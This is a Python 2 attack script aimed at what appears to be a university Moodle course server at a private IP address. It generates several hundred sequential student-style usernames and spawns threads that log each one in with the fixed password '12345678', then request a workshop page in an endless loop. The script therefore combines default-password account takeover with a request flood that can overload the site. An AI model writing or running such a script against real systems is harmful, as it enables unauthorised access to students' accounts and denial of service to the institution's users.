# -*- coding: utf-8 -*-
import urllib2
import urllib
import cookielib
import time
import threading

a=[]
for i in range(14061001,14061233):a.append(str(i))
for i in range(14231001,14231100):a.append(str(i))

	

def fuck(name):
    login_page = "http://10.254.25.5/course/login/index.php"
    url = "http://10.254.25.5/course/mod/workshop/view.php?id=110" 
    try:
        cj = cookielib.CookieJar()
        opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
        opener.addheaders = [('User-agent','Mozilla/6.0 (compatible; MSIE 6.0; Windows NT 5.1)')]
        data = urllib.urlencode({"username":name,"password":"12345678"})
        while True:
            opener.open(login_page,data)
            op=opener.open(url)
    except:
        pass


class timer(threading.Thread):
    def __init__(self, name):  
        threading.Thread.__init__(self)  
        self.name = name

    def run(self):
        fuck(self.name)
         
   
def test():
    for i in range(2):
        for name in a:
            timer(name).start()
    return  
   
if __name__ == '__main__':  
    test()



